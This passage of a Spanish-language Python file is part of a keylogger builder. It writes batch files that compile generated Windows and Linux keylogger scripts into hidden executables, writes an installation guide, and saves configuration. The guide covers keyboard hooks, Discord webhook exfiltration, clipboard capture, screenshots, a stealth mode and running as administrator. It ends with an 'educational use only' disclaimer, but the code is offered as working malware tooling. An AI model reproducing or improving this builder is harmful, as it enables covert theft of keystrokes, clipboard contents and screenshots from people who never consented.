echo Presione cualquier tecla para salir...
pause > nul
exit
'''
        
        bat_filename = f"COMPILAR_FIXED_{self.config['machine']}.bat"
        with open(bat_filename, 'w', encoding='utf-8') as f:
            f.write(bat_content)
        
        print(f"[✓] Batch file CORREGIDO creado: {bat_filename}")
        
        # También crear una versión SUPER SIMPLE
        self.create_simple_batch(python_file)
        
        return bat_filename
    
    def create_simple_batch(self, python_file):
        """Crea un batch file SIMPLE que siempre funciona"""
        simple_bat = f'''@echo off
chcp 65001 > nul
echo.
echo COMPILADOR SIMPLE - KEYLOGGER
echo =============================
echo.
echo Este .bat usa "python -m PyInstaller" que SIEMPRE funciona.
echo.
echo Compilando {python_file}...
echo.
python -m PyInstaller --onefile --noconsole --clean "{python_file}"
echo.
if exist "dist\\{python_file.replace('.py', '.exe')}" (
    echo ¡EXITO! Archivo creado:
    echo dist\\{python_file.replace('.py', '.exe')}
    echo.
    echo Tamaño del ejecutable:
    for %%F in ("dist\\{python_file.replace('.py', '.exe')}") do echo   %%~zF bytes
) else (
    echo ERROR: No se pudo compilar
    echo.
    echo Soluciones:
    echo 1. Ejecutar como Administrador
    echo 2. Instalar dependencias: pip install pyinstaller
    echo 3. Probar el script Python primero: python "{python_file}"
)
echo.
pause
'''
        
        simple_filename = f"COMPILAR_SIMPLE_{self.config['machine']}.bat"
        with open(simple_filename, 'w', encoding='utf-8') as f:
            f.write(simple_bat)
        
        print(f"[✓] Batch file SIMPLE creado: {simple_filename}")
        return simple_filename
    
    def create_installation_guide_fixed(self):
        """Crea una guía completa de instalación CORREGIDA"""
        guide = f'''GUÍA COMPLETA - KEYLOGGER CORREGIDO {self.config['machine']}
==================================================
FECHA: {self.config['date']}
AUTOR: {self.config['author']}
VERSIÓN: CORREGIDA (.bat con python -m PyInstaller)

ARCHIVOS GENERADOS:
==================

1. PARA WINDOWS (VERSIÓN CORREGIDA):
   ----------------------------------
   • windows_keylogger_fixed_{self.config['machine']}.py
     - Script Python del keylogger corregido
   
   • COMPILAR_FIXED_{self.config['machine']}.bat
     - Batch file completo con menú
   
   • COMPILAR_SIMPLE_{self.config['machine']}.bat
     - Versión simple que siempre funciona

2. PARA LINUX (opcional):
   ----------------------
   • linux_real_keylogger_{self.config['machine']}.py
     - Keylogger para Linux

INSTRUCCIONES DETALLADAS - WINDOWS:
==================================

⚠️ PASO CRÍTICO: ¡EL .BAT ESTÁ CORREGIDO!

1. COPIA A WINDOWS:
   ---------------
   Lleva estos archivos a Windows:
   - windows_keylogger_fixed_{self.config['machine']}.py
   - COMPILAR_FIXED_{self.config['machine']}.bat (o el SIMPLE)

2. EJECUTA COMO ADMINISTRADOR:
   ---------------------------
   Click derecho en el .bat → "Ejecutar como administrador"

3. EL .BAT AHORA USA:
   ------------------
   python -m PyInstaller   (en lugar de solo pyinstaller)
   
   Esto SOLUCIONA el error "pyinstaller no se reconoce"

4. OPCIONES DEL MENÚ:
   ------------------
   [1] Instalar dependencias
   [2] Instalar pyHook manual (si falla)
   [3] Compilar .exe OCULTO (recomendado)
   [4] Compilar .exe VISIBLE (para debug)
   [5] Compilar con nombre personalizado

5. EL .EXE SE CREA EN:
   ------------------
   Carpeta: dist\\
   Nombre: {self.config['machine']}.exe

DEPENDENCIAS NECESARIAS EN WINDOWS:
==================================
pip install pyinstaller      # Para compilar
pip install pyHook           # Hook de teclado
pip install pypiwin32        # Para Windows API
pip install pynput           # Alternativa a pyHook
pip install requests         # Para webhook Discord
pip install pywin32          # ¡ESENCIAL para clipboard!
pip install pyautogui        # Para screenshots

SI PYHOOK FALLA:
===============
Descargar manualmente de:
https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook

Buscar: pyHook-1.5.1-cp312-cp312-win_amd64.whl
(ajusta "cp312" por tu versión de Python)

Luego: pip install pyHook-1.5.1-cp312-cp312-win_amd64.whl

SOLUCIÓN DE PROBLEMAS:
=====================

1. "pyinstaller no se reconoce"
   → El .bat CORREGIDO usa "python -m PyInstaller" ✓

2. El .exe no se crea
   → Verifica que Python esté instalado
   → Ejecuta como Administrador
   → Prueba el script primero: python windows_keylogger_fixed_*.py

3. Clipboard no funciona
   → Asegúrate de instalar: pip install pywin32

4. Teclas especiales no se capturan
   → El código ya está corregido con mapeo completo

CONFIGURACIÓN ACTUAL:
====================
• Máquina: {self.config['machine']}
• Webhook: {'✅ CONFIGURADO' if self.config['webhook'] != 'SIMULATION_MODE' else '📱 MODO SIMULACIÓN'}
• Clipboard: {'✅ ACTIVADO' if self.config['clipboard'] else '❌ DESACTIVADO'}
• Stealth: {'✅ ACTIVADO' if self.config['stealth'] else '❌ DESACTIVADO'}
• Consola: {'🚫 OCULTA' if self.config['hide_console'] else '👀 VISIBLE'}

ARCHIVOS .BAT GENERADOS:
=======================
• COMPILAR_FIXED_{self.config['machine']}.bat → Menú completo
• COMPILAR_SIMPLE_{self.config['machine']}.bat → Directo y simple

AMBOS USAN: python -m PyInstaller (SIEMPRE funciona)

⚠️ ADVERTENCIA LEGAL:
===================
ESTE SOFTWARE ES EXCLUSIVAMENTE PARA:
• Educación en ciberseguridad
• Pruebas en sistemas propios
• Laboratorios controlados

NUNCA usar en sistemas sin autorización explícita.
==================================================
'''
        
        guide_file = f"GUIA_INSTALACION_FIXED_{self.config['machine']}.txt"
        with open(guide_file, 'w', encoding='utf-8') as f:
            f.write(guide)
        
        print(f"[✓] Guía de instalación CORREGIDA creada: {guide_file}")
        return guide_file
    
    def save_config(self):
        """Guarda la configuración"""
        config_file = f"config_{self.config['machine']}.json"
        with open(config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
        
        print(f"[✓] Configuración guardada: {config_file}")
        return config_file
    
    def run(self):
        """Ejecuta el builder completo"""
        self.show_banner()
        
        # Obtener configuración
        self.get_user_input()
        
        # Guardar configuración
        self.save_config()
        
        print(f"\n{'='*60}")
        print("GENERANDO PROYECTO - .BAT CORREGIDOS")
        print('='*60)
        
        files_created = []
        
        # Generar keylogger Linux
        if self.config['platform'] in ['1', '3']:
            try:
                linux_file = self.generate_linux_keylogger_real()
                files_created.append(linux_file)
            except Exception as e:
                print(f"[!] Error Linux: {e}")
        
        # Generar keylogger Windows CORREGIDO
        if self.config['platform'] in ['2', '3']:
            try:
                windows_file = self.generate_windows_keylogger_fixed()
                files_created.append(windows_file)
            except Exception as e:
                print(f"[!] Error Windows: {e}")
        
        # Crear guía de instalación CORREGIDA
        try:
            guide_file = self.create_installation_guide_fixed()
            files_created.append(guide_file)
        except Exception as e:
            print(f"[!] Error guía: {e}")
        
        # Mostrar resumen final
        self.show_final_summary_fixed(files_created)
    
    def show_final_summary_fixed(self, files):
        """Muestra resumen final detallado CORREGIDO"""
        print(f"\n{'='*60}")
        print("✅ PROYECTO COMPLETADO - .BAT CORREGIDOS")
        print('='*60)
        
        print(f"\n📋 CONFIGURACIÓN:")
        print(f"   Máquina: {self.config['machine']}")
        print(f"   .bat CORREGIDOS: ✅ python -m PyInstaller")
        print(f"   Clipboard: {'✅ ACTIVADO' if self.config['clipboard'] else '❌ DESACTIVADO'}")
        print(f"   Teclas especiales: ✅ FIX APLICADO")
        
        print(f"\n📁 ARCHIVOS CREADOS:")
        for file in files:
            if file and os.path.exists(file):
                try:
                    size = os.path.getsize(file) // 1024
                    icon = "🐍" if file.endswith('.py') else "📄" if file.endswith('.txt') else "🅱️" if file.endswith('.bat') else "📋"
                    print(f"   {icon} {file} ({size} KB)")
                except:
                    print(f"   📄 {file}")
        
        print(f"\n🚀 INSTRUCCIONES CLAVE - .BAT CORREGIDOS:")
        
        if f"windows_keylogger_fixed_{self.config['machine']}.py" in str(files):
            print(f"\n   🔵 WINDOWS (IMPORTANTE):")
            print(f"      1. Archivo principal: windows_keylogger_fixed_{self.config['machine']}.py")
            print(f"      2. .bat CORREGIDO: COMPILAR_FIXED_{self.config['machine']}.bat")
            print(f"      3. ¡USA python -m PyInstaller! (ya está en el .bat)")
            print(f"      4. Ejecuta como Administrador")
            print(f"      5. El .exe se crea en: dist\\")
        
        print(f"\n🔧 MEJORAS APLICADAS:")
        print("   • .bat usa python -m PyInstaller (siempre funciona)")
        print("   • Clipboard funcional con pywin32")
        print("   • Teclas especiales mapeadas")
        print("   • Batch file simple alternativo")
        
        print(f"\n📖 Guía completa en: GUIA_INSTALACION_FIXED_{self.config['machine']}.txt")
        
        print(f"\n{'='*60}")
        print("✅ LISTO - ¡.bat CORREGIDOS para Windows!")
        print('='*60)

def main():
    """Función principal"""
    try:
        builder = RealKeyloggerBuilder()
        builder.run()
        
    except KeyboardInterrupt:
        print("\n[!] Cancelado por usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()